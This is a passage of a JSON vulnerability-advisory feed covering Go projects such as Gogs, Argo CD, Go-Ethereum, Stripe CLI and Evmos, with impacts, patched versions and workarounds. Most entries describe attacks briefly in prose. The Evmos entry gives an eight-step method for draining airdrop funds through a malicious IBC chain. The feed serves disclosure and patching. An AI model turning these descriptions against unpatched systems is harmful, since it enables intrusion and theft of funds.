"severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-03-15T20:02:54Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-j34v-3552-5r7j", "modified": "2022-03-01T22:04:17Z", "published": "2022-03-01T22:04:17Z", "aliases": [], "summary": "Multiple security issues in Pomerium's embedded envoy", "details": "Envoy, which Pomerium is based on, has issued multiple CVEs impacting stability and security.\n\nThough Pomerium may not be vulnerable to all of the issues, it is recommended that all users upgrade to Pomerium v0.16.4 as soon as possible to minimize risk.\n\n### Impact\n\n- Possible DoS or crash\n- Resources available to unauthorized users\n- Pomerium may trust upstream certificates that should not be trusted\n\n### Patches\nPatched in v0.16.4\n\n### Workarounds\nNo\n\n### References\n\n[Envoy Security Announcement](https://groups.google.com/g/envoy-security-announce/c/QBGxoqZdTR4)\n\n* [CVE-2021-43824](https://github.com/envoyproxy/envoy/security/advisories/GHSA-vj5m-rch8-5r2p) (CVSS Score 6.5, Medium): Envoy 1.21.0 and earlier - Potential null pointer dereference when using JWT filter safe_regex match\n* [CVE-2021-43825](https://github.com/envoyproxy/envoy/security/advisories/GHSA-h69p-g6xg-mhhh) (CVSS Score 6.1, Medium): Envoy 1.21.0 and earlier - Use-after-free when response filters increase response data, and increased data exceeds downstream buffer limits.\n* [CVE-2021-43826](https://github.com/envoyproxy/envoy/security/advisories/GHSA-cmx3-fvgf-83mf) (CVSS Score 6.1, Medium): Envoy 1.21.0 and earlier - Use-after-free when tunneling TCP over HTTP, if downstream disconnects during upstream connection establishment\n* [CVE-2022-21654](https://github.com/envoyproxy/envoy/security/advisories/GHSA-5j4x-g36v-m283) (CVSS Score 7.3, High): Envoy 1.7.0 and later - Incorrect configuration handling allows mTLS session re-use without re-validation after validation settings have changed.\n* [CVE-2022-21655](https://github.com/envoyproxy/envoy/security/advisories/GHSA-7r5p-7fmh-jxpg) (CVSS Score 7.5, High): Envoy 1.21 and earlier - Incorrect handling of internal redirects to routes with a direct response entry\n* [CVE-2022-21657](https://github.com/envoyproxy/envoy/security/advisories/GHSA-837m-wjrv-vm5g) (CVSS Score 3.1, Low): Envoy 1.20.1 and earlier - X.509 Extended Key Usage and Trust Purposes bypass\n\n### For more information\nIf you have any questions or comments about this advisory:\n\nOpen an issue in [pomerium/pomerium](https://github.com/pomerium/pomerium/issues)\nEmail us at [security@pomerium.com](mailto:security@pomerium.com)\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/pomerium/pomerium"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.16.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/pomerium/pomerium/security/advisories/GHSA-j34v-3552-5r7j"}, {"type": "PACKAGE", "url": "https://github.com/pomerium/pomerium"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-03-01T22:04:17Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-65f3-3278-7m65", "modified": "2023-06-30T22:10:59Z", "published": "2022-03-12T00:00:34Z", "withdrawn": "2023-06-30T22:10:59Z", "aliases": [], "summary": "Duplicate Advisory: Improper Authorization in Gogs", "details": "## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-gw5h-h6hj-f56g. This link is maintained to preserve external references.\n\n## Original Description\n### Impact\n\nExpired PAM accounts and accounts with expired passwords are continued to be seen as valid. Installations use PAM as authentication sources are affected.\n\n### Patches\n\nExpired PAM accounts and accounts with expired passwords are no longer being seen as valid. Users should upgrade to 0.12.5 or the latest 0.13.0+dev.\n\n### Workarounds\n\nIn addition to marking PAM accounts as expired, also disable/lock them. Running `usermod -L <username>` will add an exclamation mark to the password hash and would result in wrong passwords responses when trying to login. \n\n### References\n\nhttps://huntr.dev/bounties/ea82cfc9-b55c-41fe-ae58-0d0e0bd7ab62/\n\n### For more information\n\nIf you have any questions or comments about this advisory, please post on https://github.com/gogs/gogs/issues/6810.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-0871"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/commit/64102be2c90e1b47dbdd379873ba76c80d4b0e78"}, {"type": "PACKAGE", "url": "https://github.com/gogs/gogs"}, {"type": "WEB", "url": "https://huntr.dev/bounties/ea82cfc9-b55c-41fe-ae58-0d0e0bd7ab62"}], "database_specific": {"cwe_ids": ["CWE-285", "CWE-862", "CWE-863"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-14T22:58:34Z", "nvd_published_at": "2022-03-11T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5gjh-5j4f-cpwv", "modified": "2022-03-28T16:46:41Z", "published": "2022-03-28T16:46:41Z", "aliases": ["CVE-2022-0415"], "summary": "Unrestricted Upload of File with Dangerous Type in Gogs", "details": "### Impact\n\nThe malicious user is able to upload a crafted `config` file into repository's `.git` directory with to gain SSH access to the server. All installations with [repository upload enabled (default)](https://github.com/gogs/gogs/blob/f36eeedbf89328ee70cc3a2e239f6314f9021f58/conf/app.ini#L127-L129) are affected.\n\n### Patches\n\nRepository file uploads are prohibited to its `.git` directory. Users should upgrade to 0.12.6 or the latest 0.13.0+dev.\n\n### Workarounds\n\n[Disable repository files upload](https://github.com/gogs/gogs/blob/f36eeedbf89328ee70cc3a2e239f6314f9021f58/conf/app.ini#L128-L129).\n\n### References\n\nhttps://huntr.dev/bounties/b4928cfe-4110-462f-a180-6d5673797902/\n\n### For more information\n\nIf you have any questions or comments about this advisory, please post on #6833.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gogs/gogs/security/advisories/GHSA-5gjh-5j4f-cpwv"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-0415"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/issues/6833"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/pull/6838"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/commit/0fef3c9082269e9a4e817274942a5d7c50617284"}, {"type": "PACKAGE", "url": "https://github.com/gogs/gogs"}, {"type": "WEB", "url": "https://huntr.dev/bounties/b4928cfe-4110-462f-a180-6d5673797902"}], "database_specific": {"cwe_ids": ["CWE-20", "CWE-434"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-28T16:46:41Z", "nvd_published_at": "2022-03-21T11:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gv9j-4w24-q7vx", "modified": "2022-03-01T21:03:11Z", "published": "2022-03-01T21:03:11Z", "aliases": [], "summary": "Improper random number generation in github.com/coredns/coredns", "details": "### Impact\n\nCoreDNS before 1.6.6 (using go DNS package < 1.1.25) improperly generates random numbers because math/rand is used. The TXID becomes predictable, leading to response forgeries.\n\n### Patches\nThe problem has been fixed in 1.6.6+.\n\n### References\n- [CVE-2019-19794](https://nvd.nist.gov/vuln/detail/CVE-2019-19794)\n\n### For more information\nPlease consult [our security guide](https://github.com/coredns/coredns/blob/master/.github/SECURITY.md) for more information regarding our security process.\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/coredns/coredns"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.6.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/coredns/coredns/security/advisories/GHSA-gv9j-4w24-q7vx"}, {"type": "PACKAGE", "url": "github.com/coredns/coredns"}], "database_specific": {"cwe_ids": ["CWE-330"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-03-01T21:03:11Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-h3q4-vmw4-cpr5", "modified": "2022-03-28T22:26:45Z", "published": "2022-03-16T00:00:38Z", "aliases": ["CVE-2021-29134"], "summary": "Path Traversal in Gitea", "details": "The avatar middleware in Gitea before 1.13.6 allows Directory Traversal via a crafted URL.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "code.gitea.io/gitea"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.13.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-29134"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/pull/15125/files"}, {"type": "PACKAGE", "url": "https://github.com/go-gitea/gitea"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/releases"}, {"type": "WEB", "url": "https://github.com/go-gitea/gitea/releases/tag/v1.13.6"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-03-18T23:27:37Z", "nvd_published_at": "2022-03-15T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-pvx3-gm3c-gmpr", "modified": "2022-03-18T20:06:42Z", "published": "2022-03-05T00:00:46Z", "aliases": ["CVE-2022-23327"], "summary": "Denial of Service in Go-Ethereum", "details": "A design flaw in Go-Ethereum 1.10.12 and older versions allows an attacker node to send 5120 future transactions with a high gas price in one message, which can purge all of pending transactions in a victim node's memory pool, causing a denial of service (DoS).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ethereum/go-ethereum"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.10.12"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23327"}, {"type": "WEB", "url": "https://dl.acm.org/doi/pdf/10.1145/3460120.3485369"}, {"type": "PACKAGE", "url": "https://github.com/ethereum/go-ethereum"}, {"type": "WEB", "url": "https://tristartom.github.io/docs/ccs21.pdf"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-09T19:20:04Z", "nvd_published_at": "2022-03-04T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vmf7-hmh6-vv57", "modified": "2022-03-18T20:06:58Z", "published": "2022-03-05T00:00:46Z", "aliases": ["CVE-2022-23328"], "summary": "Denial of Service in Go-Ethereum", "details": "A design flaw in all versions of Go-Ethereum allows an attacker node to send 5120 pending transactions of a high gas price from one account that all fully spend the full balance of the account to a victim Geth node, which can purge all of pending transactions in a victim node's memory pool and then occupy the memory pool to prevent new transactions from entering the pool, resulting in a denial of service (DoS).", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ethereum/go-ethereum"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.10.16"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23328"}, {"type": "WEB", "url": "https://dl.acm.org/doi/pdf/10.1145/3460120.3485369"}, {"type": "PACKAGE", "url": "https://github.com/ethereum/go-ethereum"}, {"type": "WEB", "url": "https://tristartom.github.io/docs/ccs21.pdf"}, {"type": "WEB", "url": "http://ethereum.com"}, {"type": "WEB", "url": "http://go-ethereum.com"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-09T19:20:00Z", "nvd_published_at": "2022-03-04T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h6h5-6fmq-rh28", "modified": "2022-03-24T00:12:46Z", "published": "2022-03-24T00:12:46Z", "aliases": ["CVE-2022-24731"], "summary": "Path traversal allows leaking out-of-bound files from Argo CD repo-server", "details": "### Impact\n\nAll unpatched versions of Argo CD starting with v1.5.0 are vulnerable to a path traversal vulnerability allowing a malicious user with read/write access to leak sensitive files from Argo CD's repo-server.\n\nA malicious Argo CD user who has been granted [`create` or `update` access to Applications](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/#rbac-resources-and-actions) can leak the contents of any text file on the repo-server. By crafting a malicious Helm chart and using it in an Application, the attacker can retrieve the sensitive file's contents either as part of the generated manifests or in an error message. The attacker would have to know or guess the location of the target file.\n\nSensitive files which could be leaked include files from other Application's source repositories (potentially decrypted files, if you are using a decryption plugin) or any secrets which have been mounted as files on the repo-server.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.3.0\n* v2.2.6\n* v2.1.11\n\n### Workarounds\n\nThe only certain way to avoid the vulnerability is to upgrade. \n\nTo mitigate the problem, you can \n* avoid storing secrets in git\n* avoid mounting secrets as files on the repo-server\n* avoid decrypting secrets into files on the repo-server\n* carefully [limit who can `create` or `update` Applications](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/#rbac-resources-and-actions)\n\n### References\n\n* [Security documentation for the repo-server component](https://argo-cd.readthedocs.io/en/stable/operator-manual/security/#git-helm-repositories)\n* [Argo CD RBAC configuration documentation](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/#)\n\n### For more information\n\nOpen an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\nJoin us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.5.0"}, {"fixed": "2.1.11"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.2.0"}, {"fixed": "2.2.6"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/argoproj/argo-cd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.3.0-rc1"}, {"fixed": "2.3.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/argoproj/argo-cd/security/advisories/GHSA-h6h5-6fmq-rh28"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24731"}, {"type": "PACKAGE", "url": "https://github.com/argoproj/argo-cd"}], "database_specific": {"cwe_ids": ["CWE-22", "CWE-284"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-03-24T00:12:46Z", "nvd_published_at": "2022-03-23T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gw5h-h6hj-f56g", "modified": "2023-06-30T22:11:07Z", "published": "2022-03-14T22:58:37Z", "aliases": ["CVE-2022-0871"], "summary": "Gogs vulnerable to improper PAM authorization handling", "details": "### Impact\n\nExpired PAM accounts and accounts with expired passwords are continued to be seen as valid. Installations use PAM as authentication sources are affected.\n\n### Patches\n\nExpired PAM accounts and accounts with expired passwords are no longer being seen as valid. Users should upgrade to 0.12.5 or the latest 0.13.0+dev.\n\n### Workarounds\n\nIn addition to marking PAM accounts as expired, also disable/lock them. Running `usermod -L <username>` will add an exclamation mark to the password hash and would result in wrong passwords responses when trying to login. \n\n### References\n\nhttps://huntr.dev/bounties/ea82cfc9-b55c-41fe-ae58-0d0e0bd7ab62/\n\n### For more information\n\nIf you have any questions or comments about this advisory, please post on https://github.com/gogs/gogs/issues/6810.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gogs/gogs/security/advisories/GHSA-gw5h-h6hj-f56g"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-0871"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/issues/6810"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/commit/64102be2c90e1b47dbdd379873ba76c80d4b0e78"}, {"type": "PACKAGE", "url": "https://github.com/gogs/gogs"}, {"type": "WEB", "url": "https://huntr.dev/bounties/ea82cfc9-b55c-41fe-ae58-0d0e0bd7ab62"}], "database_specific": {"cwe_ids": ["CWE-862"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-14T22:58:37Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-q347-cg56-pcq4", "modified": "2022-03-14T22:57:00Z", "published": "2022-03-14T22:57:00Z", "aliases": [], "summary": "SSRF in repository migration", "details": "### Impact\n\nThe malicious user is able to discover services in the internal network through repository migration functionality. All installations accepting public traffic are affected.\n\n### Patches\n\nInternal network CIDRs are prohibited to be used as repository migration targets. Users should upgrade to 0.12.5 or the latest 0.13.0+dev.\n\n### Workarounds\n\nRun Gogs in its own private network.\n\n### References\n\nhttps://www.huntr.dev/bounties/327797d7-ae41-498f-9bff-cc0bf98cf531/\n\n### For more information\n\nIf you have any questions or comments about this advisory, please post on #6754.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/gogs/gogs/security/advisories/GHSA-q347-cg56-pcq4"}, {"type": "PACKAGE", "url": "https://github.com/gogs/gogs"}, {"type": "WEB", "url": "https://www.huntr.dev/bounties/327797d7-ae41-498f-9bff-cc0bf98cf531/"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-03-14T22:57:00Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-w4f8-fxq2-j35v", "modified": "2022-03-01T21:04:57Z", "published": "2022-03-01T21:04:57Z", "aliases": [], "summary": "Possible privilege escalation via bash completion script", "details": "The bash completion script for `fscrypt` through v0.3.2 allows injection of commands via crafted mountpoint paths, allowing privilege escalation under a specific set of circumstances. A local user who has control over mountpoint paths could potentially escalate their privileges if they create a malicious mountpoint path and if the system administrator happens to be using the `fscrypt` bash completion script to complete mountpoint paths. We recommend upgrading to v0.3.3 or above.\n\nFor more details, see [CVE-2022-25328](https://www.cve.org/CVERecord?id=CVE-2022-25328).", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/google/fscrypt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.3.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/google/fscrypt/security/advisories/GHSA-w4f8-fxq2-j35v"}, {"type": "PACKAGE", "url": "github.com/google/fscrypt"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-03-01T21:04:57Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-6cp7-g972-w9m9", "modified": "2022-03-18T20:12:30Z", "published": "2022-03-07T16:59:31Z", "aliases": ["CVE-2022-24732"], "summary": "Use of a Key Past its Expiration Date and Insufficient Session Expiration in Maddy Mail Server", "details": "### Impact\n\nAny configuration on any maddy version <0.5.4 using auth.pam is affected.\n\nNo password expiry or account expiry checking is done when authenticating using PAM.\n\n### Patches\n\nPatch is available as part of the 0.5.4 release.\n\n### Workarounds\n\nIf /etc/shadow authentication is used, it is possible to replace auth.pam with auth.shadow which is not affected.\n\nIt is possible to blacklist expired accounts via existing filtering mechanisms (e.g. auth_map to invalid accounts in storage.imapsql).\n\n### References\n\n* https://github.com/foxcpp/maddy/blob/3412e59a2c92106e194fa69f2f1017c020037c9c/internal/auth/pam/pam.c\n* https://linux.die.net/man/3/pam_acct_mgmt\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in https://github.com/foxcpp/maddy\n* Email fox.cpp@disroot.org\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/foxcpp/maddy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.5.4"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/foxcpp/maddy/security/advisories/GHSA-6cp7-g972-w9m9"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24732"}, {"type": "WEB", "url": "https://github.com/foxcpp/maddy/commit/7ee6a39c6a1939b376545f030a5efd6f90913583"}, {"type": "PACKAGE", "url": "https://github.com/foxcpp/maddy"}, {"type": "WEB", "url": "https://github.com/foxcpp/maddy/releases/tag/v0.5.4"}], "database_specific": {"cwe_ids": ["CWE-324", "CWE-613"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-03-07T16:59:31Z", "nvd_published_at": "2022-03-09T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-4cx6-fj7j-pjx9", "modified": "2022-03-18T21:10:48Z", "published": "2022-03-10T18:17:50Z", "aliases": ["CVE-2022-24753"], "summary": "Code injection in Stripe CLI on windows", "details": "### Impact\nA vulnerability in Stripe CLI exists on Windows when certain commands are run in a directory where an attacker has planted files. The commands are `stripe login`, `stripe config -e`, `stripe community`, and `stripe open`. MacOS and Linux are unaffected.\n\nAn attacker who successfully exploits the vulnerability can run arbitrary code in the context of the current user. The update addresses the vulnerability by throwing an error in these situations before the code can run.\n\nThere has been no evidence of exploitation of this vulnerability.\n\n### Recommendation\nUpgrade to Stripe CLI v1.7.13.\n\n### Acknowledgments\nThanks to [trungpabc](https://hackerone.com/trungpabc) for reporting the issue.\n\n### For more information\nEmail us at [security@stripe.com](mailto:security@stripe.com).\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/stripe/stripe-cli"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.7.13"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/stripe/stripe-cli/security/advisories/GHSA-4cx6-fj7j-pjx9"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24753"}, {"type": "WEB", "url": "https://github.com/stripe/stripe-cli/commit/be38da5c0191adb77f661f769ffff2fbc7ddf6cd"}, {"type": "PACKAGE", "url": "https://github.com/stripe/stripe-cli"}], "database_specific": {"cwe_ids": ["CWE-78"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-10T18:17:50Z", "nvd_published_at": "2022-03-09T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-p93v-m2r2-4387", "modified": "2022-03-01T21:05:01Z", "published": "2022-03-01T21:05:01Z", "aliases": [], "summary": "Denial of service via insufficient metadata validation", "details": "The PAM module for `fscrypt` through v0.3.2 doesn't adequately validate `fscrypt` metadata files, allowing users to create malicious metadata files that prevent other users from logging in. A local user can cause a denial of service by creating a `fscrypt` metadata file that prevents other users from logging into the system. We recommend upgrading to v0.3.3 or above.\n\nFor more details, see [CVE-2022-25327](https://www.cve.org/CVERecord?id=CVE-2022-25327).", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/google/fscrypt"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.3.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/google/fscrypt/security/advisories/GHSA-p93v-m2r2-4387"}, {"type": "PACKAGE", "url": "github.com/google/fscrypt"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-03-01T21:05:01Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-7v5r-r995-q2x2", "modified": "2022-03-24T23:23:21Z", "published": "2022-03-12T00:00:34Z", "aliases": ["CVE-2022-0870"], "summary": "SSRF in repository migration", "details": "Gogs is a self-hosted Git service. The malicious user is able to discover services in the internal network through repository migration functionality. All installations accepting public traffic are affected. Internal network CIDRs are prohibited to be used as repository migration targets. Users should upgrade to 0.12.5 or the latest 0.13.0+dev. Gogs should be ran in its own private network until users can update.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "gogs.io/gogs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.12.5"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-0870"}, {"type": "WEB", "url": "https://github.com/gogs/gogs/commit/91f2cde5e95f146bfe4765e837e7282df6c7cabb"}, {"type": "PACKAGE", "url": "https://github.com/gogs/gogs"}, {"type": "WEB", "url": "https://huntr.dev/bounties/327797d7-ae41-498f-9bff-cc0bf98cf531"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-03-14T22:57:02Z", "nvd_published_at": "2022-03-11T11:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-5jgq-x857-p8xw", "modified": "2022-03-18T20:07:34Z", "published": "2022-03-07T21:45:59Z", "aliases": ["CVE-2022-24738"], "summary": "Account compromise in Evmos", "details": "## Impact\n_What kind of vulnerability is it? Who is impacted?_\n\n### Classification\n\nThe vulnerability has been classified as `critical` with a score of `9.0` (highest). It has the potential to affect and drain unclaimed airdrop funds from Cosmos and Osmosis eligible user addresses.\n\n### Disclosure\n\nThe attack requires advanced knowledge of the internals of the core and application packages of IBC, IBC relayers, the Cosmos SDK `AnteHandler`,  and the Evmos `x/claims` module. The step-by-step attack is described below:\n\n1. An actor creates a malicious chain with a custom `AnteHandler` that skips signature verification for transactions, specifically IBC `MsgTransfer`. This allows the attacker to impersonate any account by setting a custom `sender` address field of the IBC transfer message.\n2.  The malicious actor then connects this newly created chain via IBC to Evmos and fills the `recipient` address from the transfer message with an address they control.\n3. Once the IBC packet containing the Transfer data is relayed to Evmos, it is processed by the claims module IBC middleware. Which migrates the claim records to the recipient address, which is owned by the attacker.\n4. The attacker then performs two airdrop Actions, claiming up to 75% of the total initial claimable amount.\n5. The Actor repeats steps 1., 2., and 3. for every address that has unclaimed funds from the airdrop. This automatically claims 75% of the unclaimable amount.\n6. The malicious actor performs the final Action, claiming 100% of all the user funds.\n7. Then, the attacker transfers the funds to another chain with a DEX (Osmosis, Cosmos Hub) via IBC. \n8. Finally, the attacker withdraws the total amount in fiat through a centralized exchange. \n\n### Users impacted\n\nNo users have suffered the loss of funds as no malicious chains have been connected to Evmos.\n\n## Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nThe patch involves defining a list of authorized channels for chains that are connected to Evmos via IBC. This restricts the chains that have the capability of migrating users' claims records as per the specification. By default, the authorized destination channels are `\"channel-0\"` (Osmosis) and `\"channel-3\"` (Cosmos Hub).\n\nPlease upgrade your mainnet node and validator to [`v2.0.1`](https://github.com/tharsis/evmos/releases/tag/v2.0.1) **ASAP**.\n\n## Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nNo, the fix for the critical vulnerability is state machine breaking. An upgrade procedure must be coordinated with the nodes running the network.\n\n## References\n\n_Are there any links users can visit to find out more?_\n\n* Claims module spec: [evmos.dev/modules/claims](https://evmos.dev/modules/claims)\n* Cosmos SDK documentation: [docs.cosmos.network](https://docs.cosmos.network/)\n* IBC documentation: [ibc.cosmos.network](https://ibc.cosmos.network/)\n\n## For more information\n\nIf you have any questions or comments about this advisory:\n\n* Reach out to the Core Team in [Discord](https://discord.gg/evmos)\n* Open an issue in [tharsis/evmos](http://github.com/tharsis/evmos/issues)\n* Email us at [security@thars.is](security@thars.is)\n\nThanks to the Core IBC team at Interchain GmbH for the secure disclosure of this vulnerability", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/tharsis/evmos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.0.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/tharsis/evmos/security/advisories/GHSA-5jgq-x857-p8xw"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24738"}, {"type": "WEB", "url": "https://github.com/tharsis/evmos/commit/28870258d4ee9f1b8aeef5eba891681f89348f71"}, {"type": "PACKAGE", "url": "https://github.com/tharsis/evmos"}, {"type": "WEB", "url": "https://github.com/tharsis/evmos/releases/tag/v2.0.1"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-03-07T21:45:59Z", 